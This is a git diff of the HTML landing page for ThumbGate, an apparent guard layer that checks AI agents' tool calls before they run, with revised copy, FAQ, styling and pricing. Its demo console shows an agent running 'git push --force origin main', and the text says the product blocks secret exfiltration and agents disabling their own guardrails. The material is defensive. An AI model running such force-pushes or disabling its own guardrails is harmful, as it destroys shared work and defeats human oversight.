@@ -13,10 +13,10 @@
   <meta property="og:image" content="https://thumbgate.ai/og.png">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://thumbgate.ai/og.png">
-  <title>ThumbGate — Stop AI agent mistakes before they cost you</title>
-  <meta name="description" content="Stop AI agent mistakes before they cost you. Self-serve is $19/mo; the $499 Diagnostic installs one hard, test-backed safety gate for a supported AI-agent workflow in two business days.">
-  <meta property="og:title" content="ThumbGate — Stop AI agent mistakes before they cost you">
-  <meta property="og:description" content="Not a prompt. Not a postmortem. Pre-action gates + dual path: $19/mo Pro or $499 Diagnostic gate.">
+  <title>ThumbGate — Thumbs teach. The gate enforces.</title>
+  <meta name="description" content="Self-improving firewall for AI agents. Reviewed outcomes become local rules; secret leaks and unapproved spend hard-block before tools execute.">
+  <meta property="og:title" content="ThumbGate — Thumbs teach. The gate enforces.">
+  <meta property="og:description" content="Not a prompt. Not a judge. Test-backed pre-action enforcement that improves from reviewed outcomes without retraining the model.">
   <meta property="og:type" content="website">
   <meta property="og:url" content="__APP_ORIGIN__/">
   <script defer data-domain="thumbgate.ai" src="https://plausible.io/js/script.tagged-events.js"></script>
@@ -39,16 +39,17 @@
     "applicationCategory": "DeveloperApplication",
     "operatingSystem": "macOS, Linux, Windows",
     "url": "__APP_ORIGIN__",
-    "description": "Self-improving firewall for AI coding agents. ThumbGate captures feedback as local lessons, re-ranks relevant lessons for each action, promotes repeated negative patterns into warning or blocking gates, expires stale auto-promoted gates, and runs pre-action checks before shell, file, git, deploy, or API tool calls. Detected secret exfiltration and process-kill/environment-override self-disable commands (gate-process bypass) are denied by default; strict mode blocks matching destructive-action rules.",
+    "description": "Self-improving firewall for AI coding agents. ThumbGate captures feedback as local lessons, promotes repeated concrete failures into reviewable gates, and runs pre-action checks before tool calls. Detected secret exfiltration, guardrail tampering, and supported unapproved financial mutations are denied by default; strict mode blocks other matching rules.",
     "codeRepository": "https://github.com/IgorGanapolsky/ThumbGate",
     "featureList": [
       "Pre-action PreToolUse checks for coding agents",
       "Thumbs-up/down feedback becomes reviewable local lessons",
       "Relevant lessons are re-ranked for the proposed action",
       "Repeated negative patterns can promote from warning to blocking gates",
+      "Current-turn human purchase orders for supported financial adapters",
       "Stale auto-promoted gates expire and stale lessons archive",
       "Managed Enterprise Workflow Gate for one supported workflow",
-      "Local-first install with optional shared team enforcement"
+      "Local-first install with reviewable project enforcement"
     ]
   }
   </script>
@@ -109,42 +110,26 @@
     "mainEntity": [
       {
         "@type": "Question",
-        "name": "What do I get for $499?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "One 60-minute working review for one repeated AI-agent workflow failure, one configured local gate for a supported workflow, its regression test, and a written rollout and rollback proof within two business days after access and the agreed materials are available."
-        }
-      },
-      {
-        "@type": "Question",
         "name": "Does ThumbGate block every risky command by default?",
         "acceptedAnswer": {
           "@type": "Answer",
-          "text": "No. Detected secret exfiltration and gate-process bypass attempts are denied by default. Matching destructive actions warn unless strict enforcement is enabled. The managed gate defines the right boundary for your workflow instead of pretending every warning is a firewall."
+          "text": "No. Detected secret exfiltration, guardrail tampering, and supported unapproved financial mutations are denied by default. Other matching actions warn unless strict enforcement is enabled."
         }
       },
       {
         "@type": "Question",
-        "name": "Is this the enterprise option?",
+        "name": "What does self-improving mean?",
         "acceptedAnswer": {
           "@type": "Answer",
-          "text": "Yes. The $499 Enterprise Workflow Gate is the enterprise entry offer for one supported workflow. It is not an org-wide hosted platform license: shared hosting, SSO, compliance packaging, and multi-workflow rollout require separate scope and are not generally available."
+          "text": "ThumbGate improves the control layer, not model weights. Reviewed feedback becomes local lessons; repeated concrete failures can promote into reviewable gates; stale auto-promoted gates expire."
         }
       },
       {
         "@type": "Question",
-        "name": "Does self-improving mean ThumbGate retrains my model?",
+        "name": "What do I get for $499?",
         "acceptedAnswer": {
           "@type": "Answer",
-          "text": "No. ThumbGate does not change model weights and does not silently rewrite production policy. Self-improving under your control means explicit approvals and feedback teach the local control layer what to allow, block, or escalate next time: lessons are stored and re-ranked, repeated negative patterns can promote into gates, and stale auto-promoted gates expire."
-        }
-      },
-      {
-        "@type": "Question",
-        "name": "Is the self-improving logic a black box I have to trust blindly?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "No. The promotion, demotion, and lesson-ranking logic ships in the public npm bundle under an MIT license — run npm pack thumbgate and read it yourself. Your lessons live in a local SQLite file you own, not a server you can't query. Paid tiers add hosted sync, the dashboard, and adapter coverage, not access to intelligence withheld from the free install."
+          "text": "One working review, one configured local gate for a supported workflow, its regression test, and rollout and rollback proof within two business days after access and agreed materials are available."
         }
       }
     ]
@@ -222,7 +207,7 @@
       text-decoration: none;
     }
     .nav-enterprise:hover { background: rgba(86, 227, 159, 0.14); color: var(--text) !important; }
-    .offer-stack { display: grid; gap: 14px; }
+    .offer-stack { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 18px; margin-top: 34px; }
     .pro-card {
       padding: 22px 24px;
       border: 1px solid rgba(56, 215, 255, 0.35);
@@ -230,7 +215,7 @@
       background: linear-gradient(160deg, rgba(18, 28, 40, 0.98), rgba(12, 16, 24, 0.98));
     }
     .pro-card .price strong { color: var(--cyan); }
-    .pro-card h2 { margin: 0 0 6px; font-size: 20px; }
+    .pro-card h3 { margin: 0 0 6px; font-size: 20px; }
     .pro-card > p { margin: 0 0 14px; color: var(--muted); font-size: 14px; }
     .pro-card .button-pro { width: 100%; min-height: 48px; background: var(--cyan); color: #041016 !important; box-shadow: 0 12px 35px rgba(56, 215, 255, 0.18); }
     .pro-card .checkout-note { margin: 10px 0 0 !important; color: var(--muted) !important; font-size: 12px; text-align: center; }
@@ -250,26 +235,87 @@
       font-weight: 900;
     }
     .checkout-card .button-primary { width: 100%; }
-    .hero { padding: clamp(72px, 10vw, 128px) 0 72px; }
-    .hero-grid { display: grid; grid-template-columns: minmax(0, 1.08fr) minmax(340px, 0.92fr); gap: clamp(42px, 7vw, 88px); align-items: center; }
-    .eyebrow, .section-kicker { color: var(--green); font: 800 12px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: 0.13em; text-transform: uppercase; }
-    h1 { max-width: 760px; margin: 18px 0; font-size: clamp(46px, 7vw, 78px); line-height: 0.98; letter-spacing: -0.055em; }
-    .hero-lede { max-width: 650px; margin: 0 0 24px; color: #c5ceda; font-size: clamp(18px, 2vw, 22px); line-height: 1.5; }
-    .fit-line { margin: 0 0 18px; color: var(--muted); font-size: 14px; }
-    .fit-line strong { color: var(--text); }
-    .spec-chips { display: flex; flex-wrap: wrap; gap: 8px; margin: 0 0 22px; }
-    .spec-chip {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      border: 1px solid rgba(56, 215, 255, 0.28);
-      border-radius: 999px;
-      padding: 6px 11px;
-      color: #d7e6f3;
-      background: rgba(17, 23, 34, 0.72);
-      font: 750 12px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace;
+    .hero { position: relative; overflow: hidden; padding: clamp(48px, 6vw, 80px) 0 58px; }
+    .hero::before {
+      position: absolute;
+      width: 520px;
+      height: 520px;
+      top: -300px;
+      right: -140px;
+      border-radius: 50%;
+      background: rgba(56, 215, 255, 0.11);
+      content: "";
+      filter: blur(80px);
+      pointer-events: none;
     }
-    .spec-chip strong { color: var(--cyan); font-weight: 850; }
+    .hero-grid { display: grid; grid-template-columns: minmax(0, 0.86fr) minmax(430px, 1.14fr); gap: clamp(36px, 6vw, 72px); align-items: center; }
+    .eyebrow, .section-kicker { color: var(--green); font: 800 12px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: 0.13em; text-transform: uppercase; }
+    h1 { max-width: 720px; margin: 18px 0; font-size: clamp(48px, 6.6vw, 78px); line-height: 0.95; letter-spacing: -0.06em; }
+    .hero-lede { max-width: 590px; margin: 0; color: #c5ceda; font-size: clamp(18px, 2vw, 21px); line-height: 1.5; }
+    .thumb-pair { display: flex; gap: 10px; margin-bottom: 18px; }
+    .thumb-mark {
+      display: inline-flex;
+      width: 58px;
+      height: 58px;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid;
+      border-radius: 17px;
+      background: rgba(17, 23, 34, 0.9);
+      box-shadow: inset 0 1px rgba(255, 255, 255, 0.08), 0 18px 42px rgba(0, 0, 0, 0.28);
+    }
+    .thumb-mark svg { width: 32px; height: 32px; fill: none; stroke: currentColor; stroke-linecap: round; stroke-linejoin: round; stroke-width: 2.4; }
+    .thumb-mark.up { color: var(--green); border-color: rgba(86, 227, 159, 0.5); transform: rotate(-3deg); }
+    .thumb-mark.down { color: var(--red); border-color: rgba(255, 100, 124, 0.5); transform: rotate(3deg); }
+    .thumb-mark.down svg { transform: rotate(180deg); }
+    .hero-actions { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 28px; }
+    .hero-actions .button-primary { min-height: 50px; }
+    .install-copy {
+      display: inline-flex;
+      min-height: 50px;
+      align-items: center;
+      gap: 9px;
+      border: 1px solid rgba(56, 215, 255, 0.4);
+      border-radius: 10px;
+      padding: 0 18px;
+      color: var(--cyan);
+      background: rgba(56, 215, 255, 0.07);
+      font: 750 13px/1 ui-monospace, SFMono-Regular, Menlo, monospace;
+    }
+    .install-copy:hover, .install-copy:focus-visible { border-color: var(--cyan); outline: none; }
+    .hero-proof-row { display: flex; flex-wrap: wrap; gap: 8px 18px; margin-top: 22px; color: var(--muted); font-size: 12px; }
+    .hero-proof-row span::before { margin-right: 6px; color: var(--green); content: "✓"; font-weight: 900; }
+    .hero-dashboard { margin: 13px 0 0; color: var(--muted); font: 12px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .hero-dashboard a { color: var(--cyan); text-decoration: none; }
+    .incident-console {
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(56, 215, 255, 0.32);
+      border-radius: 20px;
+      background: #070b12;
+      box-shadow: 0 38px 100px rgba(0, 0, 0, 0.5), 0 0 70px rgba(56, 215, 255, 0.07);
+    }
+    .incident-console-body { display: grid; gap: 0; padding: 12px 18px 18px; }
+    .incident-line {
+      display: grid;
+      grid-template-columns: 32px 94px minmax(0, 1fr);
+      gap: 10px;
+      align-items: start;
+      padding: 12px 0;
+      border-bottom: 1px solid rgba(39, 50, 70, 0.62);
+      font: 13px/1.45 ui-monospace, SFMono-Regular, Menlo, monospace;
+    }
+    .incident-line:last-child { border-bottom: 0; }
+    .incident-index { color: #5f6d83; }
+    .incident-label { color: var(--cyan); font-weight: 800; text-transform: uppercase; }
+    .incident-value { min-width: 0; color: #c8d2df; overflow-wrap: anywhere; }
+    .incident-line.feedback .incident-label, .incident-line.feedback .incident-value { color: var(--red); }
+    .incident-line.lesson .incident-label { color: var(--yellow); }
+    .incident-line.gate .incident-label { color: var(--green); }
+    .incident-line.denied { margin: 4px -6px 0; padding: 14px 6px; border: 1px solid rgba(255, 100, 124, 0.28); border-radius: 10px; background: rgba(255, 100, 124, 0.07); }
+    .incident-line.denied .incident-label, .incident-line.denied .incident-value { color: var(--red); font-weight: 850; }
+    .incident-receipt { display: flex; justify-content: space-between; gap: 12px; padding: 12px 18px; border-top: 1px solid #252f40; color: #7f8ca1; background: #0c111a; font: 11px/1.3 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .incident-receipt strong { color: var(--green); }
     .proof-link { color: var(--cyan); font-weight: 750; text-decoration: none; }
     .proof-link:hover { text-decoration: underline; }
     .install-hint {
@@ -320,7 +366,7 @@
     .price { display: flex; align-items: baseline; gap: 10px; margin-bottom: 8px; }
     .price strong { font-size: 44px; line-height: 1; letter-spacing: -0.05em; }
     .price span { color: var(--muted); font-size: 14px; }
-    .checkout-card h2 { margin: 0 0 6px; font-size: 21px; }
+    .checkout-card h3 { margin: 0 0 6px; font-size: 21px; }
     .checkout-card > p { margin: 0 0 22px; color: var(--muted); }
     .checkout-card label { display: block; margin-bottom: 7px; font-size: 13px; font-weight: 750; }
     .checkout-card input[type="email"] {
@@ -344,6 +390,34 @@
     .section-kicker { color: var(--cyan); }
     .section-title { max-width: 780px; margin: 12px 0 14px; font-size: clamp(32px, 4vw, 50px); line-height: 1.08; letter-spacing: -0.04em; }
     .section-lede { max-width: 700px; margin: 0; color: var(--muted); font-size: 18px; }
+    .trust-strip { padding: 18px 0; background: rgba(8, 13, 20, 0.72); }
+    .trust-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px; overflow: hidden; border: 1px solid var(--line); border-radius: 14px; background: var(--line); }
+    .trust-item { padding: 16px 18px; color: #c5ceda; background: #0c121b; text-align: center; font-size: 13px; font-weight: 750; }
+    .trust-item strong { display: block; color: var(--green); font: 850 11px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: 0.08em; text-transform: uppercase; }
+    .scenarios { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; margin-top: 34px; }
+    .scenario {
+      overflow: hidden;
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      background: linear-gradient(160deg, rgba(17, 23, 34, 0.98), rgba(9, 13, 20, 0.98));
+    }
+    .scenario-head { display: flex; align-items: center; justify-content: space-between; gap: 14px; padding: 18px 20px 12px; }
+    .scenario-head h3, .scenario-head [role="heading"] { margin: 0; font-size: 18px; font-weight: 800; }
+    .scenario-mode { border: 1px solid var(--line); border-radius: 999px; padding: 5px 8px; color: var(--muted); font: 750 10px/1 ui-monospace, SFMono-Regular, Menlo, monospace; text-transform: uppercase; }
+    .scenario pre { min-height: 112px; margin: 0; padding: 16px 20px; border-block: 1px solid rgba(39, 50, 70, 0.72); white-space: pre-wrap; color: #bdc8d6; background: #080c13; font: 12px/1.65 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .scenario-result { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 13px 20px 16px; color: var(--muted); font-size: 12px; }
+    .scenario-result strong { color: var(--red); font: 850 12px/1 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .scenario-result .mismatch { color: var(--yellow); }
+    .runtime-strip { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 24px; }
+    .runtime-strip span { border: 1px solid var(--line); border-radius: 999px; padding: 7px 11px; color: #c5ceda; background: rgba(17, 23, 34, 0.74); font: 750 12px/1 ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .difference-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin-top: 32px; }
+    .difference-card { padding: 22px; border: 1px solid var(--line); border-radius: 15px; background: var(--panel); }
+    .difference-card.featured { border-color: rgba(86, 227, 159, 0.42); background: linear-gradient(160deg, rgba(86, 227, 159, 0.08), var(--panel)); }
+    .difference-card .difference-label { color: var(--muted); font: 800 11px/1 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: 0.08em; text-transform: uppercase; }
+    .difference-card h3 { margin: 12px 0 8px; font-size: 19px; }
+    .difference-card p { margin: 0; color: var(--muted); font-size: 14px; }
+    .offers-intro { display: flex; align-items: end; justify-content: space-between; gap: 28px; }
+    .offers-intro .section-lede { max-width: 480px; }
     .loop { display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin-top: 38px; }
     .loop-step {
       position: relative;
@@ -516,10 +590,6 @@
     @media (max-width: 840px) {
       .loop-panel-grid { grid-template-columns: 1fr; }
     }
-    .deliverables { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; margin-top: 36px; }
-    .deliverable { padding: 24px; border: 1px solid var(--line); border-radius: 15px; background: var(--panel); }
-    .deliverable h3 { margin: 0 0 8px; font-size: 18px; }
-    .deliverable p { margin: 0; color: var(--muted); }
     .boundary { margin-top: 18px; padding: 18px 20px; border-left: 3px solid var(--yellow); color: var(--muted); background: rgba(255, 209, 102, 0.06); }
     .proof-grid { display: grid; grid-template-columns: minmax(0, 1.05fr) minmax(300px, 0.95fr); gap: 30px; align-items: center; margin-top: 34px; }
     .terminal { overflow: hidden; border: 1px solid #303b50; border-radius: 15px; background: #090d14; box-shadow: 0 24px 70px rgba(0, 0, 0, 0.35); }
@@ -548,114 +618,38 @@
       .nav-links > a:not(.nav-buy):not(.nav-enterprise) { display: none; }
       .nav-links { gap: 10px; }
       .hero-grid, .proof-grid { grid-template-columns: 1fr; }
-      .loop, .deliverables { grid-template-columns: 1fr; }
+      .trust-row, .difference-grid { grid-template-columns: repeat(2, 1fr); }
+      .scenarios { grid-template-columns: 1fr; }
+      .loop { grid-template-columns: 1fr; }
+      .offer-stack { grid-template-columns: 1fr; }
       .loop-step:not(:last-child)::after { content: "↓"; top: auto; right: 50%; bottom: -28px; transform: translateX(50%); }
+      .offers-intro { display: block; }
+      .offers-intro .section-lede { margin-top: 12px; }
     }
     @media (max-width: 520px) {
       .shell { width: min(calc(100% - 24px), var(--max)); }
       .nav-inner { min-height: 62px; }
+      .site-nav .nav-buy { display: none; }
       .nav-buy, .nav-enterprise { padding: 0 10px; font-size: 12px; min-height: 38px; }
-      .hero { padding-top: 62px; }
-      h1 { font-size: 46px; }
+      .nav-enterprise { white-space: nowrap; }
+      .hero { padding-top: 42px; }
+      h1 { font-size: 44px; }
+      .hero-lede { font-size: 17px; }
+      .hero-actions > * { width: 100%; }
+      .incident-line { grid-template-columns: 26px 78px minmax(0, 1fr); gap: 7px; font-size: 11px; }
+      .incident-receipt { align-items: flex-start; flex-direction: column; }
+      .trust-row, .difference-grid, .loop { grid-template-columns: 1fr; }
       .checkout-card, .pro-card { padding: 22px 18px; }
     }
 
-    /* Visual-first conversion: thumbs + diagrams */
-    .hero-thumbs {
-      display: flex;
-      align-items: center;
-      justify-content: flex-start;
-      gap: 14px;
-      margin: 0 0 18px;
-      font-size: clamp(42px, 6vw, 64px);
-      line-height: 1;
-      filter: drop-shadow(0 0 28px rgba(34, 211, 238, 0.28));
-    }
-    .hero-thumbs span {
-      display: inline-flex;
-      width: 1.15em;
-      height: 1.15em;
-      align-items: center;
-      justify-content: center;
-      border-radius: 22%;
-      background: rgba(17, 23, 34, 0.9);
-      border: 1px solid rgba(39, 50, 70, 0.9);
-    }
-    .hero-thumbs .up { border-color: rgba(86, 227, 159, 0.55); box-shadow: 0 0 0 1px rgba(86, 227, 159, 0.12); }
-    .hero-thumbs .down { border-color: rgba(255, 100, 124, 0.55); box-shadow: 0 0 0 1px rgba(255, 100, 124, 0.12); }
-    .hero-visual {
-      margin: 22px 0 0;
-      border: 1px solid rgba(56, 215, 255, 0.22);
-      border-radius: 18px;
-      overflow: hidden;
-      background: #0a1018;
-      box-shadow: 0 24px 70px rgba(0, 0, 0, 0.35);
-    }
-    .hero-visual img, .diagram-frame img {
-      display: block;
-      width: 100%;
-      height: auto;
-    }
-    .diagram-strip { padding: 56px 0 12px; }
-    .diagram-frame {
-      margin: 28px 0 0;
-      border: 1px solid rgba(56, 215, 255, 0.2);
-      border-radius: 20px;
-      overflow-x: auto;
-      overflow-y: hidden;
-      -webkit-overflow-scrolling: touch;
-      background: #0a0a0b;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-    }
-    .diagram-frame img {
-      min-width: 640px;
-    }
-    .hero-visual img {
-      min-width: 0;
-    }
-    @media (max-width: 720px) {
-      .diagram-frame img {
-        min-width: 720px;
-      }
-      .hero-visual {
-        margin-left: -4px;
-        margin-right: -4px;
-      }
-    }
-    .diagram-caption {
-      margin: 14px 0 0;
-      color: var(--muted);
-      font-size: 14px;
-      text-align: center;
-    }
-    .self-improve-callout {
-      margin: 28px 0 0;
-      padding: 20px 22px;
-      border: 1px solid rgba(86, 227, 159, 0.3);
-      border-radius: 14px;
-      background: rgba(86, 227, 159, 0.06);
-      color: #c5ceda;
-      font-size: 16px;
-      line-height: 1.55;
-      max-width: 820px;
-    }
-    .self-improve-callout strong { color: var(--green); }
     .loop-step .thumb-icon {
       display: inline-flex;
       font-size: 28px;
       line-height: 1;
       margin-bottom: 4px;
     }
-    .visual-pair {
-      display: grid;
-      grid-template-columns: 1.1fr 0.9fr;
-      gap: 18px;
-      margin-top: 28px;
-      align-items: stretch;
-    }
-    @media (max-width: 900px) {
-      .visual-pair { grid-template-columns: 1fr; }
-      .hero-thumbs { justify-content: center; }
+    @media (prefers-reduced-motion: reduce) {
+      html { scroll-behavior: auto; }
     }
   </style>
 </head>
@@ -670,8 +664,8 @@
         <a href="#how-it-works">How it works</a>
         <a href="#offers">Pricing</a>
         <a href="#proof">Proof</a>
-        <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-cta-id="nav_diagnostic_buy">Get Started · $499</a>
-        <a class="nav-buy" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_nav&amp;utm_campaign=rally_style_gtm&amp;cta_id=nav_pro_buy&amp;cta_placement=nav&amp;plan_id=pro" data-offer-link data-cta-id="nav_pro_buy">Pro · $19/mo</a>
+        <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-plan-id="sprint_diagnostic" data-cta-id="nav_diagnostic_buy">Get Started · $499</a>
+        <a class="nav-buy" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_nav&amp;utm_campaign=product_replay&amp;cta_id=nav_pro_buy&amp;cta_placement=nav&amp;plan_id=pro" data-offer-link data-plan-id="pro" data-cta-id="nav_pro_buy">Pro · $19/mo</a>
       </div>
     </div>
   </nav>
@@ -681,93 +675,112 @@
     <section class="hero">
       <div class="shell hero-grid">
         <div class="hero-copy">
-          <div class="eyebrow">Now live · Pre-action gates · Not a prompt · Not a postmortem</div>
-          <div class="hero-thumbs" aria-hidden="true"><span class="up">👍</span><span class="down">👎</span></div>
-          <h1>Stop AI agent mistakes before they cost you.</h1>
-          <p class="hero-lede">Hard allow/deny at the <strong>tool-call boundary</strong>. Audit entry written at decision time. Every approval teaches the next gate.</p>
-          <p class="fit-line"><strong>Dual path (buy + book):</strong> <strong>$499 Diagnostic</strong> maps one expensive failure on Claude Code, Cursor, Codex, or similar agents and installs a hard gate with proof — or self-serve <strong>Pro at $19/mo</strong> if you already know the loop. Free local evaluate stays free.</p>
-          <div class="spec-chips" aria-label="What ThumbGate does">
-            <span class="spec-chip"><strong>Capture</strong> feedback</span>
-            <span class="spec-chip"><strong>Rank</strong> lessons</span>
-            <span class="spec-chip"><strong>Promote</strong> gates</span>
-            <span class="spec-chip"><strong>Block</strong> next action</span>
+          <div class="thumb-pair" aria-label="ThumbGate feedback controls">
+            <span class="thumb-mark up" role="img" aria-label="Thumbs up">
+              <svg viewBox="0 0 32 32" aria-hidden="true"><path d="M10 14 15 4c.8-1.6 3.2-1.1 3.2.7V11h6.4c2.1 0 3.7 1.9 3.2 3.9l-2.2 9.2a4 4 0 0 1-3.9 3.1H10m0-13.2H5.2A2.2 2.2 0 0 0 3 16.2v8.6A2.2 2.2 0 0 0 5.2 27H10V14Z"/></svg>
+            </span>
+            <span class="thumb-mark down" role="img" aria-label="Thumbs down">
+              <svg viewBox="0 0 32 32" aria-hidden="true"><path d="M10 14 15 4c.8-1.6 3.2-1.1 3.2.7V11h6.4c2.1 0 3.7 1.9 3.2 3.9l-2.2 9.2a4 4 0 0 1-3.9 3.1H10m0-13.2H5.2A2.2 2.2 0 0 0 3 16.2v8.6A2.2 2.2 0 0 0 5.2 27H10V14Z"/></svg>
+            </span>
           </div>
-          <figure class="hero-visual">
-            <img src="/assets/diagrams/hero-thumbs.svg" width="640" height="360" alt="ThumbGate: thumbs up and thumbs down become a pre-action gate that can ALLOW, WARN, or DENY before the tool call runs" loading="eager" decoding="async">
-          </figure>
-          <a class="proof-link" href="#proof">See a strict-mode deny example ↓</a>
-          <a class="proof-link-secondary" href="#how-it-works" style="margin-left:14px;color:var(--cyan);font-weight:750;text-decoration:none">See how the self-improving loop works ↓</a>
-          <p class="install-hint"><code>npx thumbgate init</code> free local evaluate · first hard gate usually minutes after install · <a href="/pricing">how we stack up</a></p>
-          <p class="install-hint" id="thumbgate-dashboard-command" style="margin-top:10px;">Dashboard: <code>npx thumbgate dashboard --open</code> · <code>/thumbgate-dashboard</code> · bin <code>thumbgate-dashboard</code> if global · <a href="/dashboard#insights">demo</a></p>
+          <div class="eyebrow">Self-improving firewall for AI agents</div>
+          <h1>Thumbs teach. The gate enforces.</h1>
+          <p class="hero-lede">Reviewed outcomes become local lessons. Repeated concrete failures can become reviewable gates. The next tool call is checked before it runs.</p>
+          <div class="hero-actions">
+            <a class="button-primary" href="#enterprise-gate" data-offer-link data-plan-id="sprint_diagnostic" data-cta-id="hero_diagnostic_buy">Get one gate installed — $499</a>
+            <button class="install-copy" id="hero-install-copy" type="button" data-copy-text="npx thumbgate init" aria-label="Copy npx thumbgate init command"><span aria-hidden="true">$</span> npx thumbgate init</button>
+          </div>
+          <div class="hero-proof-row" aria-label="ThumbGate operating boundaries">
+            <span>Local-first</span>
+            <span>Pre-action</span>
+            <span>Inspectable rules</span>
+            <span>No model retraining</span>
+          </div>
+          <p class="hero-dashboard" id="thumbgate-dashboard-command">Self-serve: <a href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_hero&amp;utm_campaign=product_replay&amp;cta_id=hero_pro_buy&amp;cta_placement=hero&amp;plan_id=pro" data-offer-link data-plan-id="pro" data-revenue-cta data-cta-id="hero_pro_buy">Pro $19/mo</a> · dashboard <code>npx thumbgate dashboard --open</code></p>
         </div>
-        <div id="offers" class="offer-stack">
-          <form id="buy" class="checkout-card" action="/go/diagnostic-pay" method="POST" data-primary-checkout style="order:-1;border-color:rgba(0,110,82,.35);box-shadow:0 18px 50px rgba(0,110,82,.12);">
-            <span id="workflow-sprint-intake" data-legacy-intake-alias aria-hidden="true"></span>
-            <span id="enterprise-gate"></span>
-            <input type="hidden" name="utm_source" value="website">
-            <input type="hidden" name="utm_medium" value="homepage_checkout">
-            <input type="hidden" name="utm_campaign" value="rally_style_gtm">
-            <input type="hidden" name="utm_content" value="hero_direct_checkout">
-            <input type="hidden" name="cta_id" value="homepage_diagnostic_buy">
-            <input type="hidden" name="cta_placement" value="hero">
-            <input type="hidden" name="plan_id" value="sprint_diagnostic">
-            <input type="hidden" name="landing_path" value="/">
-            <div class="price"><strong>$__SPRINT_DIAGNOSTIC_PRICE_DOLLARS__</strong><span>one time · cash path</span></div>
-            <h2>Diagnostic Gate</h2>
-            <p><strong>Managed AI Agent Workflow Gate.</strong> Bring the failure. Leave with one hard gate and proof — ranked burn, configured pre-action check, regression test. Not a strategy deck.</p>
-            <label for="buyer-email">Work email for the receipt</label>
-            <input id="buyer-email" type="email" name="customer_email" autocomplete="email" required placeholder="you@company.com">
-            <button class="button-primary" type="submit" data-revenue-cta data-cta-id="homepage_diagnostic_buy" data-cta-placement="hero">Get Started — $499 Diagnostic</button>
-            <p class="checkout-note">Secure Stripe · no subscription · one workflow. Prefer a call first? <a href="#how-it-works" style="color:inherit;font-weight:700;">See how it works</a> or email after checkout.</p>
-            <ul class="offer-points">
-              <li>60-minute working review for one workflow</li>
-              <li>One configured local gate and its regression test</li>
-              <li>Rollout and rollback proof within two business days</li>
-            </ul>
-          </form>
-          <aside class="pro-card" id="pro" aria-label="ThumbGate Pro subscription">
-            <div class="price"><strong>$19</strong><span>/mo · or $149/yr</span></div>
-            <h2>Pro</h2>
-            <p><strong>Self-serve for individual operators.</strong> Local enforcement proof, dashboard, recall, exports — start today.</p>
-            <a class="button-pro" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_hero&amp;utm_campaign=rally_style_gtm&amp;cta_id=homepage_pro_buy&amp;cta_placement=hero&amp;plan_id=pro" data-offer-link data-cta-id="homepage_pro_buy" data-revenue-cta data-cta-placement="hero">Start Pro — $19/mo</a>
-            <p class="checkout-note">Hosted checkout · cancel anytime · free local evaluate stays free</p>
-            <ul class="offer-points">
-              <li>Personal enforcement proof and local dashboard</li>
-              <li>Recall, managed adapter coverage, proof-ready exports</li>
-              <li>Preference-pair export for model-hardening workflows</li>
-            </ul>
-          </aside>
+        <div class="incident-console" aria-label="ThumbGate product replay: feedback becomes a lesson, repeated failure becomes a gate, and the next matching action is denied before execution">
+          <div class="terminal-chrome" aria-hidden="true">
+            <div class="dots"><span></span><span></span><span></span></div>
+            <span class="title">thumbgate — incident replay</span>
+            <span>local · strict</span>
+          </div>
+          <div class="incident-console-body">
+            <div class="incident-line">
+              <span class="incident-index">01</span><span class="incident-label">agent</span><span class="incident-value">git push --force origin main</span>
+            </div>
+            <div class="incident-line feedback">
+              <span class="incident-index">02</span><span class="incident-label">operator</span><span class="incident-value">thumbs down · never force-push main</span>
+            </div>
+            <div class="incident-line lesson">
+              <span class="incident-index">03</span><span class="incident-label">lesson</span><span class="incident-value">saved locally with action + outcome context</span>
+            </div>
+            <div class="incident-line gate">
+              <span class="incident-index">04</span><span class="incident-label">repeat 3/3</span><span class="incident-value">gate promoted · protect-main</span>
+            </div>
+            <div class="incident-line denied">
+              <span class="incident-index">05</span><span class="incident-label">next run</span><span class="incident-value">DENY before execution</span>
+            </div>
+          </div>
+          <div class="incident-receipt"><span>audit receipt written</span><span><strong>decision recorded</strong> · model weights unchanged</span></div>
         </div>
       </div>
     </section>
 
-    <section class="diagram-strip" id="before-after" aria-label="Before and after ThumbGate">
+    <section class="trust-strip" aria-label="ThumbGate trust boundaries">
+      <div class="shell trust-row">
+        <div class="trust-item"><strong>Where</strong>Before the tool call</div>
+        <div class="trust-item"><strong>Memory</strong>Local and reviewable</div>
+        <div class="trust-item"><strong>Control</strong>Allow · warn · deny</div>
+        <div class="trust-item"><strong>Learning</strong>Rules, not weights</div>
+      </div>
+    </section>
+
+    <section id="incidents">
       <div class="shell">
-        <div class="section-kicker">Why it’s called ThumbGate</div>
-        <h2 class="section-title">Thumbs teach. The gate enforces.</h2>
-        <div class="visual-pair">
-          <figure class="diagram-frame">
